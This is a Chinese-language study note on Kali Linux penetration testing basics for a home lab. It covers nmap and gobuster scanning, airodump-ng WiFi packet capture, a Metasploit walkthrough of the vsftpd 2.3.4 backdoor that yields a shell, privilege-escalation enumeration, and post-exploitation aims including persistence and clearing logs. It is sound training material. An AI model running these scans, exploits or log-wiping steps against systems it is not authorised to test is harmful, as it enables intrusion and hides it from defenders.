# Kali渗透测试基础

> 本文仅用于合法的学习与研究。**绝对禁止在未经授权的情况下**对任何公网IP进行扫描、测试或攻击。

## 一、搭建渗透测试实验室

最正确、最安全、最有效的学习方法是搭建一个属于自己的虚拟渗透测试环境。

### 所需组件

**虚拟化软件（免费）：**
- VirtualBox (Oracle)
- VMware Workstation Player (VMware)

**攻击机（Attacker VM）：**
- Kali Linux（预装数百种渗透测试工具）
- 下载适用于虚拟化软件的镜像文件（`.ova` 或 `.vmdk`）

**靶机（Target VM）：**
- **Metasploitable2 / Metasploitable3**：故意存在大量漏洞的Linux虚拟机，初学者完美起点
- **OWASP Juice Shop**：故意设计得不安全的现代Web应用程序
- **VulnHub**：大量社区贡献的漏洞虚拟机镜像

### 搭建步骤

^lab-setup

1. 安装 VirtualBox 或 VMware
2. 导入 Kali Linux 虚拟机
3. 导入一个或多个靶机虚拟机（如 Metasploitable2）

**网络配置（关键步骤）：**

在虚拟机软件中创建仅主机网络 (Host-Only Network) 或 NAT 网络 (NAT Network)。

将 Kali 虚拟机和所有靶机虚拟机的网络适配器都设置到这个相同的虚拟网络中。

这样它们可以互相通信，但与主电脑和外部公网隔离，所有"攻击"流量都留在这个安全的沙箱里。

4. 启动 Kali 和靶机。靶机终端或登录界面通常会显示它的IP地址。**这个IP地址就是你要练习"攻击"的目标。**

## 二、信息收集（Reconnaissance）

### 主机发现与端口扫描：nmap

^nmaps-usage

`nmap` (Network Mapper) 是最核心的信息收集工具。

```bash
# 对目标IP进行全面扫描
# -sV: 探测端口上运行服务的具体版本
# -sC: 使用默认脚本集进行更深入探测
# -p-: 扫描所有65535个TCP端口
# -oN: 将输出保存到文件
sudo nmap -sV -sC -p- -oN nmap_scan.txt 192.168.56.102
```

各参数说明：

| 参数 | 作用 |
|------|------|
| `-sV` | 探测服务具体版本，例如 "Apache httpd 2.2.8" |
| `-sC` | 使用默认脚本集进行更深入的探测 |
| `-p-` | 扫描全部 65535 个 TCP 端口 |
| `-oN` | 将输出保存到文件，便于后续分析 |
| `-sS` | SYN 扫描（半开放扫描），更隐蔽 |
| `-O` | 尝试识别操作系统 |

### 常用 nmap 命令示例

```bash
# 快速扫描常用1000个端口
nmap 192.168.56.102

# 扫描特定端口范围
nmap -p 1-1000 192.168.56.102

# UDP 端口扫描（速度较慢）
sudo nmap -sU -p 1-1000 192.168.56.102

# 扫描整个子网的主机存活
nmap -sn 192.168.56.0/24

# 综合扫描（版本检测 + 脚本 + OS识别）
sudo nmap -A 192.168.56.102
```

### 目录与文件扫描（针对Web服务）

如果 nmap 发现目标开放了 80/443 端口（HTTP/HTTPS），使用目录扫描工具：

```bash
# 使用 gobuster 扫描网站隐藏目录和文件
gobuster dir -u http://192.168.56.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## 三、WiFi 扫描

^wifi-scanning

```bash
# 查看无线网卡
iwconfig

# 开启网卡监听模式（以 wlan0 为例）
sudo airmon-ng start wlan0

# 扫描周围WiFi网络
sudo airodump-ng wlan0mon

# 扫描特定信道
sudo airodump-ng -c 6 wlan0mon

# 扫描特定网络并抓包
sudo airodump-ng -c 6 --bssid <目标MAC> -w capture wlan0mon
```

### airodump-ng 输出解读

- **BSSID**：AP的MAC地址
- **PWR**：信号强度（越接近0越强）
- **CH**：信道
- **ENC**：加密方式（WPA2、WEP、OPN等）
- **ESSID**：WiFi名称

## 四、IP 扫描与局域网探测

^ip-scanning

```bash
# 使用 nmap 扫描整个子网
nmap -sn 192.168.1.0/24

# arp-scan 扫描局域网设备
sudo arp-scan --local

# netdiscover 被动/主动探测
sudo netdiscover -r 192.168.1.0/24

# fping 快速ICMP主机存活探测
fping -a -g 192.168.1.0/24 2>/dev/null
```

## 五、漏洞分析（Vulnerability Analysis）

### 手动查找

将服务名称和版本号（如 "vsftpd 2.3.4"）在以下资源中搜索：

- [Exploit-DB](https://www.exploit-db.com/)
- 搜索引擎
- CVE 数据库

### 自动扫描

使用漏洞扫描器如 Nessus 或 OpenVAS（Kali 内置），可自动匹配服务版本与已知漏洞库。

```bash
# 在 Kali 中使用 searchsploit 搜索本地 Exploit-DB
searchsploit vsftpd
searchsploit apache 2.2
```

## 六、漏洞利用（Exploitation）

### Metasploit Framework (msfconsole)

这是 Kali 中最强大、最常用的漏洞利用框架。

```bash
# 启动
msfconsole
```

**典型利用流程：**

```bash
# 1. 搜索漏洞
msf6 > search vsftpd 2.3.4

# 2. 使用漏洞模块
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor

# 3. 查看需要设置的参数
msf6 > show options

# 4. 设置目标IP
msf6 > set RHOSTS 192.168.56.102

# 5. 执行攻击
msf6 > exploit
```

如果成功，将获得目标的 shell（命令行界面）。

## 七、权限提升（Privilege Escalation）

通常初始访问权限可能是低权限用户。常用提权技术：

- 利用内核漏洞（Linux: `uname -a` → 搜索内核版本漏洞）
- 查找 SUID 配置不当的文件：`find / -perm -4000 -type f 2>/dev/null`
- 利用计划任务（Cron Jobs）的弱点
- 查找明文存储的密码（配置文件、备份文件等）
- sudo 配置不当：`sudo -l`

```bash
# 常用提权信息收集
id
whoami
uname -a
cat /etc/os-release
sudo -l
ls -la /etc/cron*
find / -writable -type f 2>/dev/null | grep -v proc
```

## 八、后期工作（Post-Exploitation）

- **建立持久性 (Persistence)**：创建后门，便于再次访问
- **横向移动 (Lateral Movement)**：以当前攻陷的机器为跳板，攻击网络内其他机器
- **清除痕迹 (Clearing Tracks)**：删除日志文件，隐藏活动踪迹

## 九、无桌面环境操作 Kali

^headless-kali

在没有GUI桌面环境的情况下使用 Kali：

```bash
# 查看IP地址
ip a
ifconfig

# 查看路由
ip r

# 测试网络连通性
ping 8.8.8.8

# 启动/停止服务
sudo systemctl start <service>
sudo systemctl stop <service>
sudo systemctl status <service>

# 文本编辑器
nano <file>
vim <file>

# 查看日志
journalctl -xe
tail -f /var/log/syslog

# 文件操作
ls -la
cd /path
cp /source /dest
mv /source /dest
rm file
```

## 十、在线学习资源

^learning-resources

- **[TryHackMe](https://tryhackme.com/)**：非常友好、引导式的学习房间
- **[Hack The Box](https://www.hackthebox.com/)**：更具挑战性的靶场，模拟真实环境
- **[VulnHub](https://www.vulnhub.com/)**：社区贡献的漏洞虚拟机镜像
- **官方文档**：`man nmap`、`msfconsole --help` 等

## 十一、渗透测试基本流程总结

1. **信息收集**（nmap、gobuster）
2. **漏洞分析**（searchsploit、OpenVAS）
3. **漏洞利用**（Metasploit、手工利用）
4. **权限提升**（内核漏洞、SUID、配置错误）
5. **后期工作**（持久化、横向移动、清除痕迹）

## 十二、相关笔记

- [[../计算机网络知识/内网穿透|内网穿透]]
- [[../服务器运维/SSH配置与远程连接|SSH配置与远程连接]]
